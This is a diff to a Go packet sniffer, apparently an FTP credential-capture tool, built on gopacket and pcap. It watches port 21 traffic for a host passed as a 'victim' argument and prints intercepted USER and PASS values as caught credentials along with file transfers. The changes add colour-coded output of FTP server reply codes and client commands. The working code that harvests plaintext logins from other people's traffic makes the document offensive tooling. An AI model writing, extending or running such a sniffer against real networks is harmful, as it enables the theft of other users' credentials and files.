@@ -5,10 +5,11 @@ import (
 	"fmt"
 	"log"
 	"strings"
+	"strconv"
 	"errors"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
-    "github.com/google/gopacket/pcap"
+        "github.com/google/gopacket/pcap"
 	"os"
 )
 
@@ -18,10 +19,14 @@ var (
 	timeout time.Duration = pcap.BlockForever
 
 	/* prettify */
-	red   = "\033[31m"
-	cyan  = "\033[36m"
-	green = "\033[32m"
-	fn    = "\033[0m"
+	cyan   = "\033[36m"
+	green  = "\033[32m"
+	white  = "\033[37m"
+	yellow = "\033[33m"
+	red    = "\033[31m"
+	fn     = "\033[0m"
+
+	color  = []string{fn,cyan,green,white,yellow,red}
 )
 
 /* 
@@ -64,27 +69,48 @@ func parseCaughtPacket(packet gopacket.Packet) {
 	if appLayer != nil && (tcp.SrcPort == 21 || tcp.DstPort == 21) && 
 		linkLayer.LinkFlow().Src().String() == os.Args[2] {
 		payload := strings.Split(string(appLayer.Payload()), " ")
+		cmdID := strings.TrimSuffix(payload[0], "\r\n")
 		
-		fmt.Printf("[DEBUG] %s\n", string(ip.SrcIP))
-		if string(ip.SrcIP) == os.Args[5] {
+		cmdID = strings.TrimSuffix(cmdID, "\n")	
+		if ip.SrcIP.String() == os.Args[5] {
 			/* Server --> client traffic */
-			fmt.Printf("[PLACEHOLDER] caught server traffic")
+			fmt.Print("[ server sends ] ")
+			colID, err := strconv.Atoi(cmdID)
+			
+			if err != nil {
+				colID = 0
+			} else {
+				colID = colID / 100
+			}
+			col := color[colID]
+			
+			fmt.Print(col,"[",cmdID,"]",fn)
+			if len(payload) > 1 {
+				payloadArgs := strings.TrimSuffix(strings.Join(payload[1:], " "), "\n")
+				
+				fmt.Print(" with payload: ",payloadArgs)
+			}
+			fmt.Println()	
 		} else {
 			/* Client --> server traffic */
+			fmt.Print("[ client sends ] ")
 			switch payload[0] {
 			case "USER":
-				fmt.Print(red,"[CRED]",fn," Caught credentials: username ",payload[1])
+				fmt.Print(red,"[CRED]",fn," Caught credentials: USERNAME ",payload[1])
 			case "PASS":
-				fmt.Print(red,"[CRED]",fn," Caught credentials: password ",payload[1])
+				fmt.Print(red,"[CRED]",fn," Caught credentials: PASSWORD ",payload[1])
 			case "RETR":
 				fmt.Print(green,"[FILE TRANSFER]",fn," Client <--- Server: ",payload[1])
 			case "STOR":
 				fmt.Print(green,"[FILE TRANSFER]",fn," Client ---> Server: ",payload[1])
 			default:
-				fmt.Print(cyan,"[",payload[0],"]",fn)
+				fmt.Print(cyan,"[",cmdID,"]",fn)
 				if len(payload) > 1 {
-					fmt.Printf(" payload: %s\n", strings.Join(payload[1:], " "))
+					payloadArgs := strings.TrimSuffix(strings.Join(payload[1:], " "), "\n")
+					
+					fmt.Print(" with payload: ",payloadArgs)
 				}
+				fmt.Println()
 			}
 		}
 	}
@@ -96,7 +122,7 @@ func parseCaughtPacket(packet gopacket.Packet) {
  */
 
 func Sniffer(victimIP string) {
-	filter := "not ipv6 and tcp and host " + os.Args[3]
+	filter := "not ip6 and tcp and host " + os.Args[3]
 	iface, err := selectInterface()
 	
 	if err != nil {
